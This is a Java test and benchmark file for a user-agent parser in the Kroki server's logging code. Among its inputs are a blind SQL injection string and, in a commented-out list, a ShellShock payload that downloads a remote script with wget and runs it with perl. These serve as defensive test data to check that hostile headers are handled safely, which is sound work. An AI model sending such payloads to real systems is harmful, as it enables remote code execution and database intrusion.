package io.kroki.server.log;

import org.junit.jupiter.api.Test;
import org.openjdk.jmh.annotations.Benchmark;
import org.openjdk.jmh.annotations.BenchmarkMode;
import org.openjdk.jmh.annotations.Fork;
import org.openjdk.jmh.annotations.Mode;
import org.openjdk.jmh.annotations.Scope;
import org.openjdk.jmh.annotations.State;
import org.openjdk.jmh.annotations.Warmup;
import org.slf4j.MDC;
import org.slf4j.helpers.BasicMDCAdapter;
import org.slf4j.spi.MDCAdapter;
import ua_parser.Parser;

import java.util.HashMap;

import static org.assertj.core.api.Assertions.assertThat;

@State(Scope.Benchmark)
public class UserAgentContextTest {

  private final UserAgentContext userAgentContext = new UserAgentContext(new Parser());
  @Test
  void should_bla() {
    MDCAdapter mdcAdapter = MDC.getMDCAdapter();
    userAgentContext.put("curl/1.2.3",mdcAdapter);
    userAgentContext.put("HTTPie/1.2.3", mdcAdapter);
    userAgentContext.put("HTTPie/1", mdcAdapter);
    userAgentContext.put("HTTPie", mdcAdapter);
    userAgentContext.put("HTTPie/1.2", mdcAdapter);
    userAgentContext.put("HTTPie/1.2.3.4", mdcAdapter);
    userAgentContext.put("kroki-go 1.2.3", mdcAdapter);
    userAgentContext.put("Asciidoctor Kroki 1.2.3", mdcAdapter);
    userAgentContext.put("KeenWrite 1.2.3", mdcAdapter);
    userAgentContext.put("KeenWrite                                                                              1.2.3", mdcAdapter);
  }

  @Test
  void should_non_greedy() {
    MDCAdapter mdcAdapter = new BasicMDCAdapter();
    userAgentContext.put("kroki a b c d e f g h i j k l m n o p q r s t u v w x y z a b c d e f g h i j k l m n o p q r s t u v w x y z 1.2.3", mdcAdapter);
  }

  @Test
  void should_support_single_name_no_version() {
    MDCAdapter mdcAdapter = new BasicMDCAdapter();
    userAgentContext.put("kroki-go", mdcAdapter);
    HashMap<String, String> expectedContext = new HashMap<String, String>() {{
      put("user_agent", "kroki-go");
      put("user_agent_family", "kroki-go");
      put("user_agent_device_family", "Unknown");
      put("user_agent_os_family", "Unknown");
    }};
    assertThat(mdcAdapter.getCopyOfContextMap()).containsAllEntriesOf(expectedContext);
  }

  @Test
  void should_support_single_name_with_version() {
    MDCAdapter mdcAdapter = new BasicMDCAdapter();
    userAgentContext.put("kroki-go 1.2.3", mdcAdapter);
    HashMap<String, String> expectedContext = new HashMap<String, String>() {{
      put("user_agent", "kroki-go 1.2.3.4");
      put("user_agent_family", "kroki-go");
      put("user_agent_device_family", "Other");
      put("user_agent_os_family", "Other");
    }};
    assertThat(mdcAdapter.getCopyOfContextMap()).containsAllEntriesOf(expectedContext);
  }

  @Test
  void should_ignore_invalid_value_sql_injection() {
    MDCAdapter mdcAdapter = MDC.getMDCAdapter();
    UserAgentContext userAgentContext = new UserAgentContext(new Parser());
    // hacker SQL injection?!
    userAgentContext.put("-8434))) OR 9695 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (9695=9695) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))) AND (((4283=4283", mdcAdapter);
  }
/*
        testCases.add(Triple.of(new Counter(), "Android 7 Chrome 72",       "Mozilla/5.0 (Linux; Android 7.1.1; Nexus 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Android 6 Chrome 46",       "Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Android Phone",             "Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Google AdsBot",             "AdsBot-Google (+http://www.google.com/adsbot.html)"));
        testCases.add(Triple.of(new Counter(), "Google AdsBot Mobile",      "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"));
        testCases.add(Triple.of(new Counter(), "GoogleBot Mobile Android",  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"));
        testCases.add(Triple.of(new Counter(), "GoogleBot",                 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"));
        testCases.add(Triple.of(new Counter(), "Hacker SQL",                ));
        testCases.add(Triple.of(new Counter(), "Hacker ShellShock",         "() { :;}; /bin/bash -c \\\"\"wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\\\"\""));
        testCases.add(Triple.of(new Counter(), "iPad",                      "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1"));
        testCases.add(Triple.of(new Counter(), "iPhone",                    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1"));
        testCases.add(Triple.of(new Counter(), "iPhone FacebookApp",        "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 [FBAN/FBIOS;FBAV/61.0.0.53.158;FBBV/35251526;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.3;FBSS/2;FBCR/vfnl;FBID/phone;FBLC/nl_NL;FBOP/5]"));
        testCases.add(Triple.of(new Counter(), "Linux Chrome 72",           "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Win 10 Chrome 51",          "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Win 10 Edge13",             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"));
        testCases.add(Triple.of(new Counter(), "Win 7 IE11",                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"));
        testCases.add(Triple.of(new Counter(), "Win 10 IE 11",              "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"));

  private UserAgentContext userAgentContext = new UserAgentContext(new Parser());
*/

  @Benchmark
  @Fork(value = 1, warmups = 0)
  @Warmup(iterations = 3, time = 5)
  @BenchmarkMode(Mode.Throughput)
  public void y_spaces() {
    MDCAdapter mdcAdapter = MDC.getMDCAdapter();
    userAgentContext.put("KeenWrite                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            1.2.3", mdcAdapter);
  }

  @Benchmark
  @Fork(value = 1, warmups = 0)
  @Warmup(iterations = 3, time = 5)
  @BenchmarkMode(Mode.Throughput)
  public void z_simple() {
    MDCAdapter mdcAdapter = MDC.getMDCAdapter();
    userAgentContext.put("KeenWrite 1.2.3", mdcAdapter);
  }
}
